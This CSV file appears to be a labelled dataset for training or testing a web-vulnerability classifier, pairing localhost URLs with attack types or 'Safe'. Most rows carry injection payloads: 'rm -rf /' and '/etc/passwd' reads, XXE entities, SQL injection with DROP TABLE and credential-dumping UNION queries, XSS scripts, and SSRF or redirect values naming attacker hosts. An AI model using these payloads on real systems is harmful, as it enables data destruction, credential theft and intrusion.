URL,Vulnerability Type
http://127.0.0.1:5000/comments?load=config.php,File Inclusion
http://127.0.0.1:5000/product?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/profile?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/messages?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/messages?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/invoice?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/admin?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?load=config.php,File Inclusion
http://127.0.0.1:5000/dashboard?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/invoice?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/download?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/user?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/upload?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/admin?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/comments?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/file?command=| netstat -an,Command Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/review?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/profile?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/order?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/checkout?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/report?run=`whoami`,Command Injection
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/download?load=config.php,File Inclusion
http://127.0.0.1:5000/file?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/dashboard?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/messages?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/login?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/order?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/search?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/admin?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/report?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/review?load=config.php,File Inclusion
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/user?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/file?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/cart?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/admin?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/review?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/order?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/comments?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/cart?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/file?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/checkout?command=| netstat -an,Command Injection
http://127.0.0.1:5000/checkout?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/user?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/product?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/login?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/dashboard?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/report?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/user?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/messages?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/user?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/report?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/user?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/file?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/admin?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/user?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/settings?run=`whoami`,Command Injection
http://127.0.0.1:5000/login?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/user?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/profile?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/admin?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/report?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/cart?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/cart?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/login?url=http://malicious.com,Open Redirect
"http://127.0.0.1:5000/user?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/upload?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/login?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/posts?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/user?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/review?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/login?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/user?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/download?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/user?link=//unsafe.com,Open Redirect
"http://127.0.0.1:5000/product?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/settings?user=admin'--,SQL Injection
http://127.0.0.1:5000/settings?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/cart?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/invoice?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/login?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/comments?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/report?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/search?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/search?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/order?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/file?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/messages?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/invoice?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/report?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/product?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/profile?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/report?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/report?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/cart?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/dashboard?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/messages?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/invoice?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/report?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
"http://127.0.0.1:5000/profile?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/login?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/file?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/checkout?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/order?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/download?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/search?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/cart?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/posts?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/admin?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/checkout?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/upload?command=| netstat -an,Command Injection
http://127.0.0.1:5000/cart?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/messages?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/review?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/report?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/order?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/invoice?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/report?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/invoice?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/upload?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/settings?file=../../../../etc/passwd,File Inclusion
"http://127.0.0.1:5000/messages?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/cart?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/profile?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/messages?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/upload?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/profile?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/settings?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/comments?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/invoice?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/login?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/search?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/messages?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/report?command=| netstat -an,Command Injection
http://127.0.0.1:5000/login?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/invoice?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/product?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/posts?run=`whoami`,Command Injection
http://127.0.0.1:5000/product?load=config.php,File Inclusion
http://127.0.0.1:5000/profile?load=config.php,File Inclusion
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/search?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/review?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/posts?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/cart?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/messages?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/product?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/product?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/review?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/upload?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/admin?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/comments?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/cart?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/upload?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/report?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/report?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/cart?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/download?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/admin?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/download?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/download?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/order?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/review?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/product?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/posts?load=config.php,File Inclusion
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/checkout?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/file?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/report?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/messages?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/comments?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/review?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/invoice?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/report?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/dashboard?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/comments?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/invoice?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/cart?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/order?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/report?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/profile?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/login?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/login?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/login?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/product?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/file?user=admin'--,SQL Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/search?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/messages?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/product?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/file?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/user?load=config.php,File Inclusion
http://127.0.0.1:5000/profile?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/file?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/user?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/file?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/product?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/profile?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/user?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/invoice?load=config.php,File Inclusion
http://127.0.0.1:5000/posts?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/report?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/review?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/user?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/report?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/login?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/posts?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/file?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/download?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/profile?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/user?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/comments?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/settings?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/download?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/file?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/file?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/upload?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/posts?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/cart?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/messages?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/user?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/checkout?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/invoice?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/order?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/upload?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/file?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/search?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/settings?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/login?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/search?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/product?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/checkout?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/file?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/settings?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/login?load=config.php,File Inclusion
"http://127.0.0.1:5000/download?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/posts?user=admin'--,SQL Injection
http://127.0.0.1:5000/report?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/admin?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/dashboard?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/checkout?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/search?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/comments?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/upload?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/user?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/login?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/dashboard?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/search?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/review?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/posts?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/checkout?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/order?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/upload?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/invoice?command=| netstat -an,Command Injection
http://127.0.0.1:5000/profile?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/file?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/product?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/order?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/search?user=admin'--,SQL Injection
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/posts?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/messages?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/profile?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/posts?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/upload?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/file?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/report?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/cart?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/invoice?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/user?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/invoice?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/admin?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/report?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/dashboard?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/profile?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/upload?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/profile?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/checkout?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/cart?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/search?path=../../../etc/passwd,Directory Traversal
"http://127.0.0.1:5000/product?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/search?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/search?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/download?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/profile?command=| netstat -an,Command Injection
http://127.0.0.1:5000/cart?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/review?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/invoice?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/review?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/user?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/product?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/comments?user=admin'--,SQL Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/invoice?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/messages?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/comments?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/file?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/posts?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/file?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
